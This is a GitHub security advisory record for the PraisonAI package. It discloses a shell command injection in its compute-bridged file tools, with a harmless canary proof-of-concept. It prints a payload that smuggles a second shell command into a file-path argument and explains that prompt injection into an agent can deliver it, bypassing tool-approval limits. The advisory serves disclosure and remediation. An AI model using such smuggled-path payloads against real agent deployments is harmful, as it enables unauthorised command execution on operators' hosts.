@@ -1,0 +1,92 @@
+{
+  "id": "GHSA-w6h2-fr4q-xvxv",
+  "modified": "2026-06-18T14:00:07.581626218Z",
+  "published": "2026-06-18T13:55:08Z",
+  "summary": "PraisonAI: Compute-bridged file tools allow shell command injection",
+  "details": "# Compute-bridged file tools allow shell command injection\n\n## Summary\n\n`LocalManagedAgent` / `SandboxedAgent` compute bridging wraps\n`read_file`, `list_files`, and `write_file` when a compute provider is\nattached. The bridge converts those file operations into shell command strings\nusing raw path arguments, then sends those strings to shell-backed compute\nproviders.\n\nAn attacker who can influence a file-tool path argument can break out of the\nquoted path and execute arbitrary shell commands in the compute environment.\nWith `compute=\"local\"`, commands execute through the local subprocess compute\nprovider on the host. With Docker, commands execute in the container.\n\n## Affected Product\n\n- Repository: `MervinPraison/PraisonAI`\n- Package: `praisonai`\n- Component: `src/praisonai/praisonai/integrations/managed_local.py`\n- Confirmed affected:\n  - `v4.6.10`\n  - `v4.6.56`\n  - `v4.6.57`\n  - current `main` at `2f9677abb2ea68eab864ee8b6a828fd0141612e1`\n- Confirmed not affected:\n  - `v4.6.9`\n  - `v4.6.1`\n  - `v4.5.149`\n- Suggested affected range: `\u003e= 4.6.10, \u003c= 4.6.57`\n\n## Root Cause\n\nCurrent `managed_local.py` defines the bridged tool set:\n\n```python\ncompute_bridged_tools = {\"execute_command\", \"read_file\", \"write_file\", \"list_files\"}\n```\n\nFor file tools, `_bridge_file_tool()` constructs shell command strings:\n\n```python\ncommand = f'cat \"{filepath}\"'\ncommand = f'ls -la \"{directory}\"'\ncommand = f'cat \u003e \"{filepath}\" \u003c\u003c \"EOF\"\\n{content}\\nEOF'\n```\n\nThe local compute provider executes the string with\n`asyncio.create_subprocess_shell(...)`; the Docker compute provider executes it\nwith `[\"sh\", \"-c\", command]`.\n\nThe bridge keeps the low-risk `read_file` / `list_files` tool names and\nsignatures while changing their execution primitive into shell interpretation.\n\n## Why This Is Not Intended Behavior\n\nCompute bridging itself is documented and intentional. The vulnerability is\nthat file path data is interpreted as shell syntax.\n\nThe normal `read_file` and `list_files` implementations treat the same payload\nas a literal path and do not expand shell metacharacters. The approval registry\nalso marks `execute_command` as `critical`, while `read_file` and `list_files`\nare not dangerous-tool entries.\n\n## Impact\n\nAn application that exposes a PraisonAI agent using `LocalManagedAgent` or\n`SandboxedAgent` with a compute provider and a restricted file-tool set can be\ntricked into executing shell commands through a path argument to `read_file` or\n`list_files`.\n\nThis can bypass least-privilege tool configuration and tool-approval\nexpectations. A prompt-injection path, chat endpoint, automation webhook, or\nother user-controlled agent task can supply the file path argument without the\noperator granting `execute_command`.\n\n## Local PoV\n\nThe PoV is local-only and harmless. It uses an environment canary and compares\nnormal file tools against compute-bridged file tools.\n\nMinimal inline reproducer:\n\n```python\nimport os\nfrom pathlib import Path\n\nfrom praisonai.integrations.managed_local import LocalManagedAgent, LocalManagedConfig\nfrom praisonaiagents.tools import list_files, read_file\n\nworkdir = Path(\".prai-cand-006-pov-workdir\")\nworkdir.mkdir(exist_ok=True)\n(workdir / \"safe.txt\").write_text(\"SAFE_CONTENT\\n\", encoding=\"utf-8\")\n\ncanary = \"PRAISONAI_CAND_006_COMMAND_EXECUTED\"\nos.environ[\"PRAI_CAND_006_CANARY\"] = canary\npayload = 'missing\"; printf \"$PRAI_CAND_006_CANARY\"; #'\n\n# Control: normal file tools treat the payload as a literal path.\nnormal_read = read_file(str(workdir / payload))\nnormal_list = str(list_files(str(workdir) + '\"; printf \"$PRAI_CAND_006_CANARY\"; #'))\n\ncfg = LocalManagedConfig(\n    name=\"prai-cand-006-poc\",\n    tools=[\"read_file\", \"list_files\"],\n    working_dir=str(workdir),\n)\nmanaged = LocalManagedAgent(config=cfg, compute=\"local\")\ntools = {tool.__name__: tool for tool in managed._resolve_tools()}\n\nbridged_read = tools[\"read_file\"](payload)\nbridged_list = tools[\"list_files\"]('.\"; printf \"$PRAI_CAND_006_CANARY\"; #')\n\nprint(\"normal_read_contains_canary\", canary in normal_read)\nprint(\"normal_list_contains_canary\", canary in normal_list)\nprint(\"bridged_read_contains_canary\", canary in bridged_read)\nprint(\"bridged_list_contains_canary\", canary in bridged_list)\n```\n\nCommand:\n\n```bash\npython3 \\\n  submission-bundle/praisonai-prai-cand-006-compute-file-tool-command-injection/poc/prai_cand_006_compute_file_tool_command_injection.py \\\n  --repo artifacts/repos/praisonai-current\n```\n\nCurrent-head result:\n\n```json\n{\n  \"describe\": \"v4.6.57-4-g2f9677ab\",\n  \"vulnerable\": true,\n  \"normal_controls\": {\n    \"read_file_payload_contains_canary\": false,\n    \"list_files_payload_contains_canary\": false\n  },\n  \"bridged_results\": {\n    \"read_file_payload_contains_canary\": true,\n    \"list_files_payload_contains_canary\": true\n  },\n  \"approval_registry\": {\n    \"execute_command_risk\": \"critical\",\n    \"read_file_risk\": null,\n    \"list_files_risk\": null\n  }\n}\n```\n\nThe payload used by the PoV is:\n\n```text\nmissing\"; printf \"$PRAI_CAND_006_CANARY\"; #\n```\n\nNormal `read_file` treats this as a literal missing filename. The bridged tool\nconstructs:\n\n```sh\ncat \"missing\"; printf \"$PRAI_CAND_006_CANARY\"; #\"\n```\n\nand returns the canary from the compute shell.\n\n## Suggested Fix\n\nDo not implement file operations by constructing shell command strings from\npath/content arguments.\n\nPreferred fix:\n\n1. Add provider-native file APIs for read, write, and list operations, or pass\n   arguments as structured argv where the provider supports it.\n2. Preserve the normal file-tool path validation and workspace boundary checks\n   for compute-bridged file tools.\n3. Treat `write_file` content as data, not shell source. The current heredoc\n   construction is also unsafe if content can contain the delimiter.\n4. Add regression tests that use paths containing `\"`, `;`, `$()`, backticks,\n   newline, and `#` and assert no shell execution occurs.\n5. Keep `execute_command` as the only bridge path that intentionally accepts a\n   shell command string, with critical approval semantics.\n\nA minimal stopgap is to remove `read_file`, `list_files`, and `write_file` from\n`compute_bridged_tools` until safe provider-native file operations exist.\n\n## Suggested Severity\n\nThe vector assumes an attacker has low-privilege access to an agent interface\nthat can request file-tool use. If a deployment exposes such an agent without\nauthentication, `PR:N` may be appropriate.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "praisonai",
+        "purl": "pkg:pypi/praisonai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.6.10"
+            },
+            {
+              "fixed": "4.6.59"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.6.10",
+        "4.6.11",
+        "4.6.12",
+        "4.6.13",
+        "4.6.14",
+        "4.6.15",
+        "4.6.16",
+        "4.6.18",
+        "4.6.19",
+        "4.6.20",
+        "4.6.21",
+        "4.6.22",
+        "4.6.23",
+        "4.6.24",
+        "4.6.25",
+        "4.6.26",
+        "4.6.27",
+        "4.6.28",
+        "4.6.29",
+        "4.6.30",
+        "4.6.31",
+        "4.6.32",
+        "4.6.33",
+        "4.6.34",
+        "4.6.35",
+        "4.6.36",
+        "4.6.37",
+        "4.6.38",
+        "4.6.39",
+        "4.6.40",
+        "4.6.41",
+        "4.6.42",
+        "4.6.43",
+        "4.6.44",
+        "4.6.45",
+        "4.6.46",
+        "4.6.47",
+        "4.6.48",
+        "4.6.50",
+        "4.6.51",
+        "4.6.52",
+        "4.6.53",
+        "4.6.54",
+        "4.6.55",
+        "4.6.56",
+        "4.6.57",
+        "4.6.58"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.6.58",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-w6h2-fr4q-xvxv/GHSA-w6h2-fr4q-xvxv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-w6h2-fr4q-xvxv"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MervinPraison/PraisonAI"
+    }
+  ]
+}
